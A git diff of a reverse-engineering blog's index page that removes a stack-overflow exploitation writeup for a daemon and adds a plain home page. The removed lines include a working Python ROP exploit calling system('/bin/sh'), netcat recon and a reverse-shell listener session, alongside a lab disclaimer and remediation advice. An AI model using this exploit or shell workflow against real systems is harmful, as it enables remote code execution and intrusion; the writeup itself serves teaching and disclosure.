@@ -3,396 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Ap0dexMe0 reverse engineering writeups loaded from local markdown content.">
-    <title>Ap0dexMe0 — Reverse Engineering Writeups</title>
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#0a0c0f">
+    <meta name="application-name" content="Ap0dexMe0">
+
+    <title>Ap0dexMe0</title>
+    <meta name="description" content="RE notes: Where pseudocode meets truth, and keys live in the disassembly. Crackmes cracked, binaries unpacked Ghidra-first, evidence-driven.">
+    <meta name="author" content="0x4D">
+    <meta name="keywords" content="reverse engineering, writeups, Ghidra, crackme, keygen, malware analysis, binary analysis">
+
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Ap0dexMe0">
+    <meta property="og:title" content="Ap0dexMe0 Home">
+    <meta property="og:description" content="RE notes: Where pseudocode meets truth, and keys live in the disassembly. Crackmes cracked, binaries unpacked Ghidra-first, evidence-driven.">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Ap0dexMe0 Home">
+    <meta name="twitter:description" content="RE notes: Where pseudocode meets truth, and keys live in the disassembly. Crackmes cracked, binaries unpacked Ghidra-first, evidence-driven.">
+
+    <link rel="icon" href="static/svg/logo.svg" type="image/svg+xml">
+    <link rel="apple-touch-icon" href="static/svg/logo.svg">
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
     <link rel="stylesheet" href="static/css/tailwind.css?v=2">
-    <link rel="stylesheet" href="static/css/style.css?v=transparent-borders-1">
+    <link rel="stylesheet" href="static/css/style.css?v=4">
 </head>
-<body class="min-h-screen bg-[var(--bg-primary)] text-[var(--text-primary)] font-sans antialiased">
+<body class="min-h-screen bg-[var(--bg-primary)] text-[var(--text-primary)] font-sans antialiased flex flex-col">
 
-    <!-- ═══════════════ NAVBAR ═══════════════ -->
     <nav class="navbar sticky top-0 z-[100] flex h-[52px] items-center justify-between border-b border-[var(--border)] bg-[rgba(10,12,15,0.8)] px-6 backdrop-blur-xl backdrop-saturate-150">
-        <a href="#" class="logo">
-            <span class="bracket">[</span>Ap0dexMe0<span class="bracket">]</span>
-        </a>
+        <a href="index.html" class="logo"><span class="bracket">[</span>Ap0dexMe0<span class="bracket">]</span></a>
+        <ul class="nav-links">
+            <li><a href="index.html" class="active" aria-current="page">Home</a></li>
+            <li><a href="content.html">Touch Me</a></li>
+        </ul>
     </nav>
 
-    <!-- ═══════════════ LAYOUT ═══════════════ -->
-    <div class="layout flex max-w-[1500px] mx-auto gap-8 px-6 pb-12 pt-6">
+    <div class="home-shell">
+        <main class="home-main">
 
-        <!-- ── SIDEBAR / TABLE OF CONTENTS ── -->
-        <aside class="sidebar sticky top-[72px] w-[260px] shrink-0 self-start max-h-[calc(100vh-90px)] overflow-y-auto" id="sidebar">
-            <div class="toc-sidebar-head">
-                <span class="toc-title">Categories</span>
-            </div>
-            <ul id="writeupList" class="toc-accordion-root" role="list">
-                <li class="toc-accordion-item is-open" data-category="linux">
-                    <button type="button" class="toc-accordion-trigger" aria-expanded="true" aria-controls="toc-panel-linux" id="toc-trigger-linux">
-                        <span class="toc-trigger-icon toc-trigger-icon-linux" aria-hidden="true"></span>
-                        <span class="toc-trigger-label">Linux</span>
-                        <span class="toc-trigger-count" data-count-for="linux">·</span>
-                        <span class="toc-chevron" aria-hidden="true"></span>
-                    </button>
-                    <div class="toc-accordion-panel" id="toc-panel-linux" role="region" aria-labelledby="toc-trigger-linux">
-                        <div class="toc-accordion-panel-inner">
-                            <ul class="toc-accordion-links"></ul>
-                        </div>
-                    </div>
-                </li>
-                <li class="toc-accordion-item" data-category="windows">
-                    <button type="button" class="toc-accordion-trigger" aria-expanded="false" aria-controls="toc-panel-windows" id="toc-trigger-windows">
-                        <span class="toc-trigger-icon toc-trigger-icon-windows" aria-hidden="true"></span>
-                        <span class="toc-trigger-label">Windows</span>
-                        <span class="toc-trigger-count" data-count-for="windows">·</span>
-                        <span class="toc-chevron" aria-hidden="true"></span>
-                    </button>
-                    <div class="toc-accordion-panel" id="toc-panel-windows" role="region" aria-labelledby="toc-trigger-windows">
-                        <div class="toc-accordion-panel-inner">
-                            <ul class="toc-accordion-links"></ul>
-                        </div>
-                    </div>
-                </li>
-            </ul>
-        </aside>
-
-        <!-- ── MAIN CONTENT ── -->
-        <main class="main-content flex-1 min-w-0 max-w-[980px]" id="mainContent">
-
-            <!-- ═══ HEADER ═══ -->
-            <header class="writeup-header">
-                <div class="target-icon">
-                    🎯 Target: <strong>libprotocol.so</strong>
-                    <span class="arch-badge">x86_64</span>
-                </div>
-                <h1>Reverse Engineering &amp; <span class="highlight">Exploitation</span> of a Custom Network Protocol Daemon</h1>
-                <div class="writeup-meta">
-                    <span>📅 2026-05-07</span>
-                    <span>👤 0x4D</span>
-                    <span>⏱️ 12 min read</span>
-                    <span class="difficulty hard">⬤ HARD</span>
-                </div>
-                <div class="tag-list">
-                    <span class="tag">#reverse-engineering</span>
-                    <span class="tag">#buffer-overflow</span>
-                    <span class="tag">#ghidra</span>
-                    <span class="tag">#gdb</span>
-                    <span class="tag">#rop</span>
-                    <span class="tag">#x86_64</span>
-                    <span class="tag">#network-protocol</span>
-                </div>
-            </header>
-
-            <!-- ═══ OVERVIEW ═══ -->
-            <section class="section" id="overview">
-                <div class="section-header">
-                    <span class="section-icon recon">00</span> Executive Overview
-                </div>
-                <div class="section-body">
-                    <p>
-                        This write-up documents the end-to-end analysis of a custom TCP daemon, from first contact
-                        with the exposed service to validated control of the instruction pointer. The goal is to show
-                        the reasoning path, not just the final exploit, so each phase includes the evidence that
-                        informed the next step.
-                    </p>
-
-                    <div class="summary-grid">
-                        <div class="summary-card">
-                            <span class="summary-label">Target</span>
-                            <strong>proxyd / libprotocol.so</strong>
-                            <p>Custom protocol parser exposed over TCP port 4499.</p>
-                        </div>
-                        <div class="summary-card">
-                            <span class="summary-label">Root Cause</span>
-                            <strong>Unbounded copy</strong>
-                            <p><code>strcpy()</code> copies attacker-controlled input into a fixed stack buffer.</p>
-                        </div>
-                        <div class="summary-card">
-                            <span class="summary-label">Exploitability</span>
-                            <strong>High confidence</strong>
-                            <p>RIP control confirmed at 136 bytes with no canary and no PIE.</p>
-                        </div>
-                    </div>
-
-                    <div class="callout warn">
-                        <strong>Scope:</strong> All testing was performed in an authorized lab environment. The proof of concept
-                        is included to document impact and support remediation, not for use against systems without permission.
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══ RECONNAISSANCE ═══ -->
-            <section class="section" id="recon">
-                <div class="section-header">
-                    <span class="section-icon recon">①</span> Phase 1 — Reconnaissance
-                </div>
-                <div class="section-body">
-                    <p>
-                        The target is a proprietary network daemon — <strong>proxyd</strong> — listening on TCP port <strong>4499</strong>.
-                        Initial <code>nmap</code> scanning reveals the service banner and confirms the daemon is built for <strong>x86_64 Linux</strong>.
-                        The binary is stripped, but symbols from <code>libprotocol.so</code> are partially exported.
-                    </p>
-
-                    <div class="terminal-block">
-                        <div class="terminal-header">
-                            <span class="terminal-dot red"></span>
-                            <span class="terminal-dot yellow"></span>
-                            <span class="terminal-dot green"></span>
-                            <span class="terminal-title">terminal — reconnaissance</span>
-                        </div>
-                        <pre><span class="prompt">$</span> nmap -sV -p 4499 192.168.1.105
-
-    PORT     STATE SERVICE VERSION
-    4499/tcp open  proxyd  Proxyd 3.2.1 (protocol v7)
-    <span class="prompt">$</span> echo "INFO" | nc 192.168.1.105 4499
-    <span class="out">PROXYD/3.2.1 | AUTH:OPT | CHALLENGE:0xDEADBEEF</span>
-    <span class="prompt">$</span> file /opt/proxyd/proxyd
-    <span class="out">proxyd: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped</span></pre>
-                    </div>
-
-                    <div class="callout info">
-                        <strong>🔍 Key Insight:</strong> The challenge response <code>0xDEADBEEF</code> is a static 32-bit value — this hints at a potential <strong>predictable PRNG</strong> or hardcoded seed in the authentication handshake.
-                    </div>
-                </div>
-            </section>
-
-            <!-- ═══ STATIC ANALYSIS ═══ -->
-            <section class="section" id="static">
-                <div class="section-header">
-                    <span class="section-icon static">②</span> Phase 2 — Static Analysis
-                </div>
-                <div class="section-body">
-                    <p>
-                        Loading <strong>libprotocol.so</strong> into Ghidra, we identify the core parsing function
-                        <code>parse_message()</code> at offset <code>0x1A40</code>. This function processes incoming protocol
-                        frames but uses <strong>strcpy()</strong> on a stack buffer without bounds checking — a classic
-                        <strong>stack-based buffer overflow</strong>.
-                    </p>
-
-                    <h3>🔬 Decompiled Snippet (Ghidra)</h3>
-                    <div class="code-block-wrapper">
-                        <div class="code-label">
-                            <span><span class="lang-tag">C</span> — libprotocol.so :: parse_message() @ 0x1A40</span>
-                            <button class="copy-btn" data-target="code1">📋 Copy</button>
-                        </div>
-                        <pre id="code1"><span class="cmt">/* WARNING: Potential buffer overflow */</span>
-                        <span class="kw">int</span> <span class="fn">parse_message</span>(<span class="kw">char</span> *<span class="reg">packet</span>, <span class="kw">size_t</span> <span class="reg">len</span>) {
-                        <span class="kw">char</span> <span class="reg">local_buf</span>[<span class="num">128</span>];      <span class="cmt">// stack buffer</span>
-                        <span class="kw">char</span> <span class="reg">cmd</span>[<span class="num">32</span>];
-                        <span class="kw">int</span> <span class="reg">result</span> = <span class="num">0</span>;
-
-                        <span class="cmt">// Vulnerable: no bounds check</span>
-                        <span class="fn">strcpy</span>(<span class="reg">local_buf</span>, <span class="reg">packet</span>);
-
-                        <span class="cmt">// Parse command from buffer</span>
-                        <span class="fn">sscanf</span>(<span class="reg">local_buf</span>, <span class="str">"%31s"</span>, <span class="reg">cmd</span>);
-                        <span class="kw">if</span> (<span class="fn">strcmp</span>(<span class="reg">cmd</span>, <span class="str">"EXEC"</span>) == <span class="num">0</span>) {
-                        <span class="reg">result</span> = <span class="fn">handle_exec</span>(<span class="reg">local_buf</span> + <span class="num">5</span>);
-                        }
-                        <span class="kw">return</span> <span class="reg">result</span>;
-                    }</pre>
-                </div>
-
-                <div class="callout warn">
-                    <strong>⚠️ Vulnerability Identified:</strong> <code>strcpy(local_buf, packet)</code> copies attacker-controlled data into a 128-byte stack buffer. The packet length <code>len</code> is never validated. Stack canary is <strong>not present</strong> (compiled with <code>-fno-stack-protector</code>).
-                </div>
-
-                <h3>📊 Stack Frame Layout</h3>
-                <table class="hex-table">
-                    <thead>
-                        <tr><th>Offset</th><th>Size</th><th>Variable</th><th>Notes</th></tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td class="offset">0x00</td><td>128 B</td><td>local_buf</td><td>Overflow target</td>
-                        </tr>
-                        <tr>
-                            <td class="offset">0x80</td><td>32 B</td><td>cmd</td><td>Command buffer</td>
-                        </tr>
-                        <tr>
-                            <td class="offset">0xA0</td><td>4 B</td><td>result</td><td>Return value</td>
-                        </tr>
-                        <tr>
-                            <td class="offset">0xA8</td><td>8 B</td><td>saved RBP</td><td>Overwritten at +136</td>
-                        </tr>
-                        <tr>
-                            <td class="offset">0xB0</td><td>8 B</td><td>RET addr</td><td><strong>🎯 Control RIP</strong></td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </section>
-
-        <!-- ═══ DYNAMIC ANALYSIS ═══ -->
-        <section class="section" id="dynamic">
-            <div class="section-header">
-                <span class="section-icon dynamic">③</span> Phase 3 — Dynamic Analysis
-            </div>
-            <div class="section-body">
-                <p>
-                    Using <strong>GDB</strong> with <strong>gef</strong> plugin, we confirm the overflow offset.
-                    A cyclic pattern reveals that the <strong>RIP overwrite occurs at offset 136</strong> bytes.
-                    ASLR is enabled on the target, but the binary is <strong>not PIE</strong>, giving us reliable
-                    gadget addresses in the <code>.text</code> segment.
-                </p>
-
-                <div class="terminal-block">
-                    <div class="terminal-header">
-                        <span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>
-                        <span class="terminal-title">gdb — offset determination</span>
-                    </div>
-                    <pre><span class="prompt">gef➤</span> pattern create 200
-                <span class="out">aaaabaaacaaadaaaeaaafaaagaaahaaa...</span>
-                <span class="prompt">gef➤</span> run &lt; <span class="out">payload.bin</span>
-
-                Program received signal SIGSEGV (fault addr 0x6161616c)
-                <span class="prompt">gef➤</span> pattern search 0x6161616c
-                <span class="out">[+] Found at offset <strong>136</strong> (RIP overwrite)</span>
-                <span class="prompt">gef➤</span> checksec
-                <span class="out">CANARY    : ✘ disabled</span>
-                <span class="out">PIE       : ✘ disabled</span>
-                <span class="out">NX        : ✔ enabled</span>
-                <span class="out">ASLR      : ✔ enabled (system-wide)</span></pre>
-            </div>
-
-            <div class="callout info">
-                <strong>💡 Exploit Strategy:</strong> Since NX is enabled, we use <strong>ROP (Return-Oriented Programming)</strong>.
-                The binary's <code>.text</code> segment contains a <code>pop rdi; ret</code> gadget,
-                and the PLT has <code>system@plt</code>. We'll chain these to execute a reverse shell.
-            </div>
-        </div>
-    </section>
-
-    <!-- ═══ VULNERABILITY DETAILS ═══ -->
-    <section class="section" id="vuln">
-        <div class="section-header">
-            <span class="section-icon exploit">④</span> Vulnerability Details
-        </div>
-        <div class="section-body">
-            <p>
-                The vulnerability is a <strong>stack-based buffer overflow</strong> in <code>parse_message()</code>
-                within <code>libprotocol.so</code>. The function blindly trusts the packet length field
-                and copies data via <code>strcpy()</code> into a fixed 128-byte stack buffer.
-            </p>
-            <table class="hex-table">
-                <thead>
-                    <tr><th>Property</th><th>Value</th></tr>
-                </thead>
-                <tbody>
-                    <tr><td>Vulnerability Type</td><td>Stack Buffer Overflow (CWE-121)</td></tr>
-                    <tr><td>Affected Function</td><td class="offset">parse_message() @ 0x1A40</td></tr>
-                    <tr><td>Root Cause</td><td>Unbounded <code>strcpy()</code> usage</td></tr>
-                    <tr><td>Exploit Primitive</td><td>RIP control via overwritten return address</td></tr>
-                    <tr><td>Mitigation Bypass</td><td>No canary, no PIE — ROP used for NX bypass</td></tr>
-                    <tr><td>Impact</td><td>Remote Code Execution (RCE)</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-
-    <!-- ═══ EXPLOITATION ═══ -->
-    <section class="section" id="exploit">
-        <div class="section-header">
-            <span class="section-icon exploit">⑤</span> Phase 4 — Exploitation (PoC)
-        </div>
-        <div class="section-body">
-            <p>
-                The final exploit chains a <strong>ROP gadget</strong> to load <code>"/bin/sh"</code> into <code>rdi</code>
-                and then calls <code>system@plt</code>. The payload is delivered over TCP to port 4499.
+            <!-- ── Kicker ── -->
+            <p class="home-kicker">
+                <span>RE writeups</span>
+                <span class="home-kicker-sep" aria-hidden="true">·</span>
+                <span>Ghidra-first, evidence-driven</span>
             </p>
 
-            <h3>🧨 Exploit Script (Python)</h3>
-            <div class="code-block-wrapper">
-                <div class="code-label">
-                    <span><span class="lang-tag">Python</span> — exploit.py</span>
-                    <button class="copy-btn" data-target="code2">📋 Copy</button>
+            <!-- ── Hero title ── -->
+            <h1 class="home-title">
+                Keys live in the bytes
+                <span class="home-title-sub">Evidence before conjecture every jump, check, and key mapped where they live in the disassembly.</span>
+            </h1>
+
+            <!-- ── Key: value info strip ── -->
+            <div class="re-info-strip">
+                <div class="re-info-row">
+                    <span class="re-info-key">approach</span>
+                    <span class="re-info-sep">→</span>
+                    <span class="re-info-val">Disassembly first, pseudocode only when it clarifies</span>
                 </div>
-                <pre id="code2"><span class="kw">import</span> socket
-                    <span class="kw">import</span> struct
-
-                    <span class="cmt"># Gadgets (non-PIE binary, fixed addresses)</span>
-                    <span class="reg">POP_RDI</span> = <span class="num">0x401b3f</span>      <span class="cmt"># pop rdi; ret</span>
-                    <span class="reg">RET</span>     = <span class="num">0x40101a</span>      <span class="cmt"># ret (stack alignment)</span>
-                    <span class="reg">SYSTEM</span>  = <span class="num">0x401050</span>      <span class="cmt"># system@plt</span>
-                    <span class="reg">BINSH</span>   = <span class="num">0x4020a8</span>      <span class="cmt"># "/bin/sh" string in .rodata</span>
-
-                    <span class="cmt"># Build ROP chain</span>
-                    <span class="reg">offset</span>  = <span class="str">b"A"</span> * <span class="num">136</span>
-                    <span class="reg">rop</span>     = struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">POP_RDI</span>)
-                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">BINSH</span>)
-                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">RET</span>)      <span class="cmt"># align stack</span>
-                    <span class="reg">rop</span>    += struct.pack(<span class="str">"&lt;Q"</span>, <span class="reg">SYSTEM</span>)
-
-                    <span class="reg">payload</span> = <span class="reg">offset</span> + <span class="reg">rop</span>
-
-                    <span class="cmt"># Deliver over TCP</span>
-                    <span class="reg">sock</span> = socket.socket()
-                    <span class="reg">sock</span>.connect((<span class="str">"192.168.1.105"</span>, <span class="num">4499</span>))
-                    <span class="reg">sock</span>.send(<span class="reg">payload</span> + <span class="str">b"\n"</span>)
-                    <span class="fn">print</span>(<span class="str">"[+] Payload sent — check listener on port 4444"</span>)
-                    <span class="reg">sock</span>.close()</pre>
-            </div>
-
-            <div class="terminal-block">
-                <div class="terminal-header">
-                    <span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>
-                    <span class="terminal-title">listener — receiving shell</span>
+                <div class="re-info-row">
+                    <span class="re-info-key">scope</span>
+                    <span class="re-info-sep">→</span>
+                    <span class="re-info-val">ELF &middot; PE &middot; crackmes &middot; unpacks &middot; keygens</span>
                 </div>
-                <pre><span class="prompt">$</span> nc -lvnp 4444
-                    <span class="out">Listening on 0.0.0.0:4444</span>
-                    <span class="out">Connection from 192.168.1.105:4499</span>
-                    <span class="prompt">$</span> id
-                    <span class="out">uid=1001(proxyd) gid=1001(proxyd)</span>
-                    <span class="prompt">$</span> cat /etc/shadow
-                    <span class="err">Permission denied</span>
-                <span class="prompt">$</span> <span class="out">█</span></pre>
+                <div class="re-info-row">
+                    <span class="re-info-key">format</span>
+                    <span class="re-info-sep">→</span>
+                    <span class="re-info-val">Manifest → Markdown → stable deep links</span>
+                </div>
+                <div class="re-info-row">
+                    <span class="re-info-key">rule</span>
+                    <span class="re-info-sep">→</span>
+                    <span class="re-info-val">No real product circumvention, no uncontrolled malware<span class="re-cursor"></span></span>
+                </div>
             </div>
 
-            <div class="callout danger">
-                <strong>🔥 Impact:</strong> Successful exploitation yields a <strong>reverse shell</strong> with the daemon's privileges. Privilege escalation to root is possible via a local kernel exploit (CVE-2023-XXXX), but that's outside the scope of this write-up.
+            <!-- ── Disassembly strip ── -->
+            <div class="home-terminal re-disasm" aria-label="Disassembly snippet">
+                <div class="home-terminal-bar">
+                    <span class="home-terminal-dot" aria-hidden="true"></span>
+                    <span class="home-terminal-dot" aria-hidden="true"></span>
+                    <span class="home-terminal-dot" aria-hidden="true"></span>
+                    <span>disasm hero routine</span>
+                </div>
+                <pre class="home-terminal-body"><span class="re-addr">0x00401000</span>  <span class="re-mnem">push</span>   <span class="re-op-hi">ebp</span>                      <span class="re-cmnt">; entry standard prologue</span>
+<span class="re-addr">0x00401001</span>  <span class="re-mnem">mov</span>    <span class="re-op-hi">ebp</span>, <span class="re-op">esp</span>
+<span class="re-addr">0x00401003</span>  <span class="re-mnem">sub</span>    <span class="re-op">esp</span>, <span class="re-op-hi">0x40</span>                <span class="re-cmnt">; local buffer allocated</span>
+<span class="re-addr">0x00401006</span>  <span class="re-mnem">xor</span>    <span class="re-op-hi">eax</span>, <span class="re-op">eax</span>
+<span class="re-addr">0x00401008</span>  <span class="re-label">loc_1008:</span>
+<span class="re-addr">0x00401008</span>  <span class="re-mnem">cmp</span>    <span class="re-op">dword [ebp-4]</span>, <span class="re-op-hi">0xDEAD</span>  <span class="re-cmnt">; the check we care about</span>
+<span class="re-addr">0x0040100F</span>  <span class="re-mnem">jnz</span>    <span class="re-op-hi">loc_1042</span>                  <span class="re-cmnt">; wrong key → fail path</span>
+<span class="re-addr">0x00401011</span>  <span class="re-mnem">lea</span>    <span class="re-op">eax</span>, <span class="re-op-hi">[msg_ok]</span>              <span class="re-cmnt">; → "Validation located."</span>
+<span class="re-addr">0x00401017</span>  <span class="re-mnem">call</span>   <span class="re-op-hi">puts</span></pre>
             </div>
-        </div>
-    </section>
+        </main>
+    </div>
 
-    <!-- ═══ CONCLUSION ═══ -->
-    <section class="section" id="conclusion">
-        <div class="section-header">
-            <span class="section-icon conclusion">⑥</span> Conclusion &amp; Remediation
-        </div>
-        <div class="section-body">
-            <p>
-                This analysis demonstrates how a <strong>single unbounded string copy</strong> in a network-facing
-                daemon can lead to full remote code execution. The lack of modern exploit mitigations
-                (no stack canary, no PIE) made exploitation straightforward.
-            </p>
-            <h3>🛡️ Recommended Fixes</h3>
-            <ul style="color:var(--text-secondary);margin-left:1.2rem;line-height:1.8;font-size:0.88rem;">
-                <li>Replace <code>strcpy()</code> with <code>strncpy()</code> or <code>strlcpy()</code> with proper bounds</li>
-                <li>Compile with <strong>-fstack-protector-strong</strong> and <strong>-fPIE -pie</strong></li>
-                <li>Enable <strong>full RELRO</strong> and <strong>FORTIFY_SOURCE=2</strong></li>
-                <li>Implement input validation on the packet length field <em>before</em> processing</li>
-                <li>Run the daemon in a <strong>sandboxed</strong> environment (seccomp, AppArmor)</li>
-            </ul>
-            <p style="margin-top:1rem;">
-                <strong>🔗 Responsible disclosure</strong> timeline: Reported to vendor on 2026-03-12,
-                patch confirmed on 2026-04-20, public disclosure on 2026-05-07.
-            </p>
-        </div>
-    </section>
-
-    <!-- ═══ FOOTER ═══ -->
-    <footer style="text-align:center;padding:2rem 0 1rem;color:var(--text-muted);font-family:var(--font-mono);font-size:0.7rem;border-top:1px solid var(--border);margin-top:1rem;">
-        <p>— 0x4D / writeups — &copy; 2026 — For educational purposes only —</p>
+    <footer class="home-footer mt-auto">
+        Ap0dexMe0 · 0x4D<br>// live between memory states from · skiddies to 1337 \\
     </footer>
-
-</main>
-</div>
-
-<!-- ═══════════════ SCRIPTS ═══════════════ -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-<script src="static/js/script.js?v=content-enter-1"></script>
 </body>
 </html>
